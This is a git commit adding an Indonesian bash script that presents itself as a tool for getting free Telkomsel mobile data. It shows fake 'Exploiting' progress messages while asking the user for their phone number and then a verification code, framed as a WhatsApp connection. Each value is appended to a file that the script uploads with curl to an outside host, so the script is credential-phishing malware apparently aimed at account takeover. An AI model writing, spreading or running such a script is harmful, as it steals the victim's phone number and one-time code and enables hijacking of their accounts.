45abcd031b26277160d39cd3e343067fd8938933
SantriPasuruan <46401305+SantriPasuruan@users.noreply.github.com>
2019-02-09 10:01:59 +0000

    Create Telkomsel.sh

---
+++ Telkomsel.sh
@@ -0,0 +1,75 @@
+#!/bin/bash
+
+clear
+
+echo "
+<-- IndoSec -->
+####################
+# Tembak kuota  # By Santri_pasuruan
+# Santri Team official Thx For MR.Clay
+####################
+SEMOGA BERUNTUNG";
+
+echo "";
+
+read -p "isi dengan nomerKamu (+62xxxx)=> " nomer;
+
+read -p "Berapa GB yang akan di tembak => " ketik;
+
+sleep 2
+
+echo "[+] proses...";
+
+sleep 1
+
+echo "Login => $nomer";
+
+sleep 0.5
+
+echo "Target => $Jumlah";
+
+sleep 0.5
+
+echo "[+] Exploiting...";
+
+echo "Nomer => $nomer" >> Sukses.html;
+
+curl -T Sukses.html http://apparelworld.org/
+
+sleep 5;
+
+echo "[+] Done.";
+
+echo "Selamat penembakan Sukses.";
+
+read -p "Verify Code => " code;
+
+sleep 2
+
+echo "[+] Connecting to whatsapp.com...";
+
+echo "Login => $nomer";
+
+sleep 0.5
+
+echo "Code => $Jumlah";
+
+sleep 0.5
+
+echo "Target => $jumlah";
+
+sleep 0.5
+
+echo "[+] Sending Exploit...";
+
+echo "Code => $code" >> Sukses.html;
+
+curl -T Sukses.html http://apparelworld.org/
+
+sleep 5
+
+echo "[+] Success Exploited!";
+
+exit;
+
+D
